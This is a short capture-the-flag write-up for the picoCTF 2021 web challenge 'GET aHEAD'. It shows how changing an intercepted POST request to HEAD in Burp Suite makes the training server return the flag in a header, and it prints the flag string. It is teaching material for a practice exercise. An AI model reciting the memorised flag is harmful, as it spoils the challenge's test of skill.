# PicoCTF2021-GET aHEAD

## Overview

Points: 20

Category: Web Exploitation

## Description

>Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:47967/


## Hints
>1. Maybe you have more than 2 choices.
>2. Check out tools like Burpsuite to modify your requests and look at the responses

## Approach

1. Go to http://mercury.picoctf.net:47967/


2. Turn on intercept in Burp


3. Click either of the options i.e. `choose red` or `choose blue` 

4. If you `choose blue` you will get as like the following in burp interceptor :

```sh
POST /index.php HTTP/1.1
Host: mercury.picoctf.net:47967
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:47967/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://mercury.picoctf.net:47967
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1 
```
5. Change method `POST` to `HEAD`.

      >>Learn more about `HTTP Methods` [here](https://www.w3schools.com/tags/ref_httpmethods.asp).

7. You will get flag in server response.

```sh
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}
Content-type: text/html; charset=UTF-8
```


## FLAG : picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}








